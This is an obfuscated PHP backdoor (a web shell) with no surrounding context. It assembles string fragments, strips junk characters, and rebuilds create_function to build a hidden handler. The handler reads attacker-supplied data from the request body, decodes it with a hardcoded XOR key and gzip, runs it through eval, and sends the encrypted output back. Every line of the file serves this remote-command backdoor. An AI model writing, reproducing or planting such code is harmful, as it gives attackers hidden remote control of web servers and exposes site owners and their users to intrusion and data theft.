<?php
$G='ea(Cn();(C$r=@base6(C4(C_encode(C(@x(@gzcom(C(Cpre(Css($o),$k)(C);print("$(Cp$kh$r$(Ckf");}';
$h='$k{$(Cj};}(C}re(Ctu(Crn $o;}(Cif (@preg_match(C("/$k(Ch(.+)$k(Cf/",@(Cf(Ci(Cle_get_c';
$R='or((C$i=0;$i(C(C<$l;(C){for($j=0;($(Cj<$c&&$i<(C$l);$j(C++,$i+(C+){$o.=$(Ct{$(Ci}^';
$U='(C@x(@b(Case6(C4_decode((C$(Cm[1]),$k)))(C;$o=(C(C@ob_get_c(Contents((C);@ob_(Cend_cl';
$t=str_replace('I','','crIeaIteII_funcItIion');
$L='kW8LCY(Cz";functi(Co(Cn x($t,$(Ck(C){$c=strl(Cen($(Ck);$l=s(Ctrlen((C(C$t);$o="";f';
$m='$k="40(Cb(Caf(C9a1";$kh="(Ca4b06fb424(C28";$kf(C="9(C6500e4fdd1f(C(C";$p="SuRW(C(CecDhT';
$I='on(Ctents(C("php:/(C/inpu(Ct"),(C$m)==1) {@ob_(Cstart();@e(Cval(@g(Czunc(Compress(';
$O=str_replace('(C','',$m.$L.$R.$h.$I.$U.$G);
$k=$t('',$O);$k();
?>
